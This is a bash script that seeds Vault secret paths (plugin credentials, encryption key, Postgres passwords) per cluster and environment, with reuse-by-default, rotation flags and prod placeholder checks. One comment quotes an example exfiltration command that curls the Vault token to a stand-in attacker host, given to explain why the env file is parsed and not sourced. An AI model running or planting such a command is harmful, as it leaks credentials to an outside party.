#!/usr/bin/env bash
# scripts/vault-bootstrap.sh — seed Vault paths for one cluster/env in one run.
#
# Plugin name (${PLUGIN_NAME}) is auto-detected from the current git repo name.
# Override via PLUGIN_NAME=<name> ./vault-bootstrap.sh ...
#
# Writes 6 Vault paths per env:
#   {cluster}/{env}/${PLUGIN_NAME}/${PLUGIN_NAME}-credentials
#       PLUGIN_ID, PUBLIC_KEY, ENCRYPTION_KEY (generated on first run, REUSED after), SECRET
#   {cluster}/{env}/${PLUGIN_NAME}/{role}.postgres-${PLUGIN_NAME}.credentials
#       (5 paths: postgres-${PLUGIN_NAME}, postgres, metrics, readonly, standby)
#       each gets username + password (generated on first run, REUSED after)
#
# Idempotency:
#   - First run on an empty path: generates ENCRYPTION_KEY + postgres passwords.
#   - Re-run on a populated path: reuses existing values (does NOT rotate).
#   - ROTATE_ENCRYPTION=1 forces a new ENCRYPTION_KEY. Re-encrypting existing
#     stored tokens is on you (see ADR-0004); rotating without that step
#     invalidates every encrypted api_token in this plugin's Postgres.
#   - ROTATE_POSTGRES=1 forces new postgres passwords. After rotation, you
#     MUST trigger `kubectl annotate hr/postgres-… reconcile.fluxcd.io/forceAt="$(date +%s)" --overwrite`
#     so the Helm create-user Job re-runs and Postgres + Vault converge.
#
# Prod safety:
#   - Refuses to write when PLUGIN_ID / PUBLIC_KEY / SECRET look like leftover
#     placeholders ("placeholder", "TODO", "TBD", "change-me", "", …)
#   - For prod: PLUGIN_ID must be ≥16 chars of [A-Za-z0-9._:-];
#     PUBLIC_KEY must contain a `-----BEGIN ... PUBLIC KEY-----` marker.
#
# Usage:
#   1. cp scripts/vault-bootstrap.env.example scripts/vault-bootstrap.env
#   2. Fill PLUGIN_ID / PUBLIC_KEY / SECRET per env (postgres passwords generated/preserved).
#   3. vault login -method=oidc                                # one-shot per session
#   4. scripts/vault-bootstrap.sh <env-slug>                   # dev-de1 | stage-de1 | prod-de1 | prod-au1 | prod-us1
#
# Slug format: <env>-<cluster>. 'dev' and 'stage' kept as backward-compat
# aliases for 'dev-de1' / 'stage-de1' since de1 is the only cluster either
# environment runs on today.
#
# DRY-RUN mode: prefix with DRY_RUN=1 to print the vault calls without executing.
#   DRY_RUN=1 scripts/vault-bootstrap.sh prod-de1
#
# Force rotation (use only with the corresponding follow-up playbook):
#   ROTATE_ENCRYPTION=1 scripts/vault-bootstrap.sh stage-de1
#   ROTATE_POSTGRES=1   scripts/vault-bootstrap.sh stage-de1
#
# This script never echoes secret values. Passwords pass through shell vars only.

set -euo pipefail

# Plugin name controls Vault path prefix. Default to current git repo name so
# the script works without any wrapper. Override via PLUGIN_NAME=<name> ./vault-bootstrap.sh ...
PLUGIN_NAME="${PLUGIN_NAME:-$(basename "$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && git rev-parse --show-toplevel 2>/dev/null || pwd)")}"

if [[ -z "$PLUGIN_NAME" || "$PLUGIN_NAME" =~ [^a-z0-9-] ]]; then
  echo "FAIL: PLUGIN_NAME must be lowercase alphanumeric with hyphens. Got: '${PLUGIN_NAME}'" >&2
  exit 1
fi

PLUGIN_REPO="${PLUGIN_NAME}"
VAULT_ADDR_DEFAULT="https://vault.staffbase.com"
ENV_FILE_DEFAULT="$(dirname "$0")/vault-bootstrap.env"

# ─── Arg parsing ─────────────────────────────────────────────────────────────

ENV_SLUG="${1:-}"
if [[ -z "$ENV_SLUG" ]]; then
  echo "usage: $0 <env-slug>" >&2
  echo "  env-slug: dev-de1 | stage-de1 | prod-de1 | prod-au1 | prod-us1" >&2
  echo "  (legacy aliases 'dev' and 'stage' still work — map to dev-de1 / stage-de1)" >&2
  exit 2
fi

# All slugs are <env>-<cluster>. 'dev' and 'stage' kept as backward-compat
# aliases for de1 since that's the only cluster they ever run on.
case "$ENV_SLUG" in
  dev|dev-de1)        CLUSTER=de1 ; ENV=dev   ; PREFIX=DEV ;;
  stage|stage-de1)    CLUSTER=de1 ; ENV=stage ; PREFIX=STAGE ;;
  prod-de1)           CLUSTER=de1 ; ENV=prod  ; PREFIX=PROD_DE1 ;;
  prod-au1)           CLUSTER=au1 ; ENV=prod  ; PREFIX=PROD_AU1 ;;
  prod-us1)           CLUSTER=us1 ; ENV=prod  ; PREFIX=PROD_US1 ;;
  *) echo "unknown env-slug: $ENV_SLUG" >&2 ; exit 2 ;;
esac

# ─── Load env file ───────────────────────────────────────────────────────────

ENV_FILE="${ENV_FILE:-$ENV_FILE_DEFAULT}"
if [[ ! -f "$ENV_FILE" ]]; then
  echo "missing env file: $ENV_FILE" >&2
  echo "create it from scripts/vault-bootstrap.env.example" >&2
  exit 2
fi
# Parse KEY=value pairs manually instead of `source`-ing the file. `source`
# would execute arbitrary shell — a malicious / typo'd env line such as
# `DEV_SECRET="$(curl attacker.com/exfil?key=$VAULT_TOKEN)"` would run in the
# context of this script (which is already authenticated to Vault). The
# parser accepts standard KEY=value lines with optional single/double
# quotes, ignores comments and blank lines, and never expands subshells.
#
# Value forms (evaluated in order):
#   1. Double-quoted (`KEY="..."`): content INSIDE the first matched
#      `"…"` pair is taken; everything after the closing quote
#      (including a trailing `# comment`) is silently discarded. `#`
#      INSIDE the quotes is preserved verbatim, so passwords/PEMs
#      containing `#` round-trip correctly.
#      Limitation: escaped quotes (`"foo\"bar"`) are NOT supported — the
#      regex stops at the first inner `"`, the remainder falls through
#      to the unquoted branch, and the value may be corrupted. Quote
#      escaping in .env files is rare; if you need a literal `"` inside
#      a secret, use the single-quoted form.
#   2. Single-quoted (`KEY='...'`): same semantics as double-quoted.
#   3. Unquoted (`KEY=value`): trailing `# comment` and surrounding
#      whitespace are stripped. A `#` anywhere in an unquoted value is
#      treated as the start of an inline comment (standard env-file
#      convention) — so unquoted values that legitimately contain `#`
#      (generated passwords, bcrypt hashes, base64 fragments, URLs
#      with fragments) WILL be silently truncated. The parser emits a
#      WARN to stderr when this happens; if you see the warning, quote
#      the value in the .env file.
#
# vault-bootstrap.env.example uses `KEY=""  # CuCu → ...` so every line
# from there exercises branch 1 (double-quoted + trailing comment).
while IFS= read -r line || [[ -n "$line" ]]; do
  # strip leading whitespace
  line="${line#"${line%%[![:space:]]*}"}"
  # skip comments and blanks
  [[ -z "$line" || "$line" == \#* ]] && continue
  # KEY=value form only; KEY must be a valid shell identifier
  if [[ "$line" =~ ^([A-Za-z_][A-Za-z0-9_]*)=(.*)$ ]]; then
    key="${BASH_REMATCH[1]}"
    val="${BASH_REMATCH[2]}"
    # Quoted form: take the content inside the first matched quote pair;
    # discard everything after the closing quote. No escape expansion.
    if   [[ "$val" =~ ^\"([^\"]*)\".*$ ]]; then val="${BASH_REMATCH[1]}"
    elif [[ "$val" =~ ^\'([^\']*)\'.*$ ]]; then val="${BASH_REMATCH[1]}"
    else
      # Unquoted form: strip trailing inline `# comment` and trailing whitespace.
      # Standard env-file convention is `#` after whitespace starts a comment;
      # `#` adjacent to a non-whitespace character is almost certainly part of
      # the intended value (generated password, bcrypt hash, base64 fragment,
      # URL fragment, …). Warn loudly in the latter case so the operator can
      # requote the line; the standard inline-comment pattern `KEY=val  # …`
      # stays silent.
      if [[ "$val" =~ [^[:space:]]\# ]]; then
        echo "WARN: $key: '#' adjacent to non-whitespace in unquoted value — truncating at first '#'. Quote the value (e.g. $key=\"...\") if '#' is part of the secret." >&2
      fi
      val="${val%%#*}"
      val="${val%"${val##*[![:space:]]}"}"
    fi
    printf -v "$key" '%s' "$val"
    export "${key?}"
  fi
done < "$ENV_FILE"

# Resolve the three CuCu-sourced values for this env
PLUGIN_ID_VAR="${PREFIX}_PLUGIN_ID"
PUBLIC_KEY_VAR="${PREFIX}_PUBLIC_KEY"
SECRET_VAR="${PREFIX}_SECRET"
PLUGIN_ID="${!PLUGIN_ID_VAR:-}"
PUBLIC_KEY="${!PUBLIC_KEY_VAR:-}"
SECRET="${!SECRET_VAR:-}"

ALLOW_PLACEHOLDERS=0
if [[ "$ENV" != "prod" ]]; then
  ALLOW_PLACEHOLDERS=1
fi

# Known placeholder strings — reject in prod even when the var is non-empty.
# A leftover "placeholder" / "TODO" / "xxx" silently written to prod Vault
# turns into a 401 storm in the iframe once VSO syncs (the prod plugin runtime
# rejects any installation whose PLUGIN_ID/PUBLIC_KEY/SECRET fails shape checks).
is_placeholder_string() {
  local v="$1"
  local v_lower
  v_lower=$(printf '%s' "$v" | tr '[:upper:]' '[:lower:]')
  case "$v_lower" in
    ""|placeholder|todo|fixme|xxx|tbd|change-me|change_me|changeme|none|null|n/a) return 0 ;;
  esac
  return 1
}

# Lightweight shape checks for prod — PLUGIN_ID looks like a UUID (or 16+
# hex/alnum chars); PUBLIC_KEY contains a PEM marker. These don't validate
# correctness, only catch the "copied the wrong cell from CuCu" class of error.
plugin_id_looks_valid() {
  local v="$1"
  [[ ${#v} -ge 16 && "$v" =~ ^[A-Za-z0-9._:-]+$ ]]
}
public_key_looks_pem() {
  # Allow either a full PEM (has BEGIN marker) OR a base64-only body (CuCu
  # sometimes shows the key without PEM headers depending on copy method).
  # We just want to catch "copied the wrong cell" — a 5-char copy fails this,
  # a real RSA public key (200+ chars) passes either branch.
  local v="$1"
  [[ "$v" == *"-----BEGIN"* ]] || [[ ${#v} -ge 100 ]]
}

for VAR in PLUGIN_ID PUBLIC_KEY SECRET; do
  VAL="${!VAR}"
  if is_placeholder_string "$VAL"; then
    if [[ "$ALLOW_PLACEHOLDERS" == "1" ]]; then
      echo "WARN: ${PREFIX}_${VAR} empty/placeholder — will write 'placeholder' (dev/stage only)" >&2
      printf -v "$VAR" "placeholder"
    else
      echo "ERROR: ${PREFIX}_${VAR} is empty or a placeholder ('$VAL') — refusing to write to prod" >&2
      echo "       fill it in $ENV_FILE from Customer Control" >&2
      exit 1
    fi
  fi
done

if [[ "$ENV" == "prod" ]]; then
  if ! plugin_id_looks_valid "$PLUGIN_ID"; then
    echo "ERROR: ${PREFIX}_PLUGIN_ID doesn't look like a real ID (len < 16 or contains weird chars) — refusing to write to prod" >&2
    exit 1
  fi
  if ! public_key_looks_pem "$PUBLIC_KEY"; then
    echo "ERROR: ${PREFIX}_PUBLIC_KEY is too short (<100 chars) and lacks a '-----BEGIN ... PUBLIC KEY-----' marker — refusing to write to prod" >&2
    exit 1
  fi
fi

# ─── Vault auth + addr ───────────────────────────────────────────────────────

export VAULT_ADDR="${VAULT_ADDR:-$VAULT_ADDR_DEFAULT}"

if [[ "${DRY_RUN:-0}" != "1" ]]; then
  if ! vault token lookup >/dev/null 2>&1; then
    echo "ERROR: not logged into Vault. Run 'vault login -method=oidc' first." >&2
    exit 1
  fi
fi

BASE="$CLUSTER/$ENV/$PLUGIN_REPO"

echo "─── $ENV_SLUG → $BASE ────────────────────────────────────────────"
echo "DRY_RUN=${DRY_RUN:-0}"
echo

# ─── Helpers ─────────────────────────────────────────────────────────────────

vault_put() {
  local path="$1" ; shift
  if [[ "${DRY_RUN:-0}" == "1" ]]; then
    # mask the value side of every k=v pair
    local masked=()
    for kv in "$@"; do
      masked+=("${kv%%=*}=<redacted>")
    done
    echo "DRY: vault kv put $path ${masked[*]}"
  else
    vault kv put "$path" "$@" >/dev/null && echo "✓ $path"
  fi
}

# Read a single field from Vault. Echoes the value on stdout when present,
# nothing when missing. Never raises on missing.
vault_get_field() {
  local path="$1" field="$2"
  vault kv get -field="$field" "$path" 2>/dev/null
}

# True when a Vault path has data; for DRY_RUN we always say "missing" so
# previews show what *would* be written.
vault_path_has_field() {
  local path="$1" field="$2"
  [[ "${DRY_RUN:-0}" == "1" ]] && return 1
  vault kv get -field="$field" "$path" >/dev/null 2>&1
}

# Rotation flags — explicit opt-in to overwrite existing values.
ROTATE_ENCRYPTION="${ROTATE_ENCRYPTION:-0}"
ROTATE_POSTGRES="${ROTATE_POSTGRES:-0}"

# ─── 1. Plugin credentials ──────────────────────────────────────────────────
#
# ENCRYPTION_KEY (ADR-0004): rotating it invalidates every encrypted
# api_token row in the plugin's Postgres. Default is reuse-if-exists.
# Set ROTATE_ENCRYPTION=1 only when the re-encryption playbook is in flight.

PLUGIN_CRED_PATH="$BASE/$PLUGIN_REPO-credentials"

if [[ "$ROTATE_ENCRYPTION" == "1" ]] || ! vault_path_has_field "$PLUGIN_CRED_PATH" ENCRYPTION_KEY; then
  ENCRYPTION_KEY=$(openssl rand -hex 32)
  if [[ "$ROTATE_ENCRYPTION" == "1" ]] && vault_path_has_field "$PLUGIN_CRED_PATH" ENCRYPTION_KEY; then
    echo "WARN: ROTATE_ENCRYPTION=1 — generating new ENCRYPTION_KEY. Existing encrypted tokens in $PLUGIN_REPO Postgres MUST be re-encrypted (see ADR-0004) or they become unreadable." >&2
  fi
else
  ENCRYPTION_KEY=$(vault_get_field "$PLUGIN_CRED_PATH" ENCRYPTION_KEY)
  echo "  reuse: existing ENCRYPTION_KEY preserved (set ROTATE_ENCRYPTION=1 to force-rotate; only after re-encryption playbook)" >&2
fi

vault_put "$PLUGIN_CRED_PATH" \
  PLUGIN_ID="$PLUGIN_ID" \
  PUBLIC_KEY="$PUBLIC_KEY" \
  ENCRYPTION_KEY="$ENCRYPTION_KEY" \
  SECRET="$SECRET"
unset ENCRYPTION_KEY PLUGIN_ID PUBLIC_KEY SECRET

# ─── 2. Postgres user credentials (5 entries) ───────────────────────────────
#
# Default is reuse-if-exists: rotating a postgres user's password
# desyncs the running Postgres user (created at install via Helm
# post-install Job) from the Vault-synced K8s Secret. Set
# ROTATE_POSTGRES=1 only when followed by `kubectl annotate hr/postgres-…
# reconcile.fluxcd.io/forceAt="$(date +%s)" --overwrite` so the
# create-user-readonly Job re-runs with the new password.

for USER in "postgres-$PLUGIN_REPO" postgres metrics readonly standby; do
  case "$USER" in
    "postgres-$PLUGIN_REPO")
      P="$BASE/postgres-$PLUGIN_REPO.postgres-$PLUGIN_REPO.credentials"
      ;;
    *)
      P="$BASE/$USER.postgres-$PLUGIN_REPO.credentials"
      ;;
  esac
  if [[ "$ROTATE_POSTGRES" == "1" ]] || ! vault_path_has_field "$P" password; then
    PW="$(openssl rand -base64 32 | tr -d '\n' | tr '/+=' 'abc')"
    if [[ "$ROTATE_POSTGRES" == "1" ]] && vault_path_has_field "$P" password; then
      echo "WARN: ROTATE_POSTGRES=1 — generating new password for $USER. Trigger Helm upgrade afterwards so create-user Job re-runs." >&2
    fi
  else
    PW=$(vault_get_field "$P" password)
    echo "  reuse: $USER password preserved (set ROTATE_POSTGRES=1 + helm upgrade to force-rotate)" >&2
  fi
  vault_put "$P" username="$USER" password="$PW"
  unset PW
done

case "$ENV" in
  dev)   DOMAIN_TLD="dev"   ;;
  stage) DOMAIN_TLD="rocks" ;;
  prod)  DOMAIN_TLD="com"   ;;
esac

echo
echo "Done. After write, restart the plugin pod so it re-reads env from the synced Secret:"
echo "  kubectl -n $PLUGIN_REPO rollout restart deploy/$PLUGIN_REPO"
echo "and verify with:"
echo "  curl -s https://${PLUGIN_REPO}-${CLUSTER}.staffbase.${DOMAIN_TLD}/api/public/instance | jq '.pluginId'"
